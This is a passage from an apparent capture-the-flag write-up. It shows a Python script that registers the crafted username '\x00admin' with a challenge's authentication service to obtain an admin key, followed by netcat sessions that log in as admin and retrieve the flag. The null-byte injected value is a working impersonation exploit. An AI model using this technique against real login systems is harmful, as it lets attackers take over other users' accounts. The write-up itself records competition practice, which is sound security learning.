<pre><code class="python">#!/usr/bin/python

from socket import *
import time, re, struct

s = socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 35565))
s.connect(('asis-ctf.ir', 12439))

print s.recv(256)

s.send('1\n')
print s.recv(256)

s.send('\x00admin\n')

print s.recv(200)
print s.recv(200)
</code></pre>

<p>This little gem returned <code>4147466b62576c7503812bbd45e23c059a0eab18e936b7ed</code>. Let&rsquo;s try it out!</p>

<pre><code class="bash">$ nc asis-ctf.ir 12439
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
2
Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
OK
User admin authenticated
</code></pre>

<p>Holy crap, it worked! Let&rsquo;s grab that secret! Fingers crossed:</p>

<pre><code class="bash">$ nc asis-ctf.ir 12439
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
3
Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
The flag is: ASIS_65cc76f02093977bfd7629086e813666
</code></pre>

<p>BOOM! We just landed another flag :) This one was actually fun to solve!</p>
]]></content>
  </entry>
  
</feed>
